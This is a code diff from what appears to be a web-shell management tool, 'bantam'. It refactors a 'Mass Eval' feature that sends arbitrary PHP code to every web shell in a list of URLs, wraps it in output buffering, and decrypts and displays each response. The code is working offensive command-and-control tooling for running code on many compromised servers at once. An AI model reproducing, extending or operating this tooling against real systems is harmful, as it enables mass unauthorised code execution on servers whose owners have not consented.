@@ -253,30 +253,57 @@ namespace bantam
         }
 
         /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="shellUrl"></param>
+        /// <param name="code"></param>
+        /// <param name="encryptResponse"></param>
+        /// <param name="responseEncryptionMode"></param>
+        /// <param name="rtb"></param>
+        private async void executeMassEval(string shellUrl, string code, bool encryptResponse, int responseEncryptionMode, bool showResponse, RichTextBox rtb)
+        {
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
+
+            if (string.IsNullOrEmpty(response.Result) == false) {
+                string result = response.Result;
+                if (encryptResponse) {
+                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
+                }
+
+                if (!showResponse) {
+                    return;
+                }
+
+                if (!string.IsNullOrEmpty(result)) {
+                    rtb.Text += "Result from (" + shellUrl + ") \r\n" + result + "\r\n\r\n";
+                }
+            }
+        }
+
+        /// <summary>
         /// Mass Eval!  
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
         private async void evalToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            bool bShow = false;
-            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", string.Empty, ref bShow);
-
+            bool showResponse = false;
+            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", string.Empty, ref showResponse);
             RichTextBox rtb = GuiHelper.RichTextBoxDialog("Mass Eval", string.Empty);
 
             foreach (ListViewItem lvClients in listViewShells.Items) {
                 string shellUrl = lvClients.Text;
                 if (Shells.ContainsKey(shellUrl)) {
                     bool encryptResponse = Shells[shellUrl].responseEncryption;
-                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
+                    int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
-
-                    if (string.IsNullOrEmpty(response.Result) == false) {
-                        string result = response.Result;
-                        if (encryptResponse) {
-                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
-                        }
+                    string finalCode = code;
+                    if (encryptResponse) {
+                        string preCode = "@ob_start();";
+                        string postCode = "$result = @ob_get_contents(); @ob_end_clean();";
+                        finalCode = preCode + code + postCode;
                     }
+                    executeMassEval(shellUrl, finalCode, encryptResponse, responseEncryptionMode, showResponse, rtb);
                 }
             }
         }
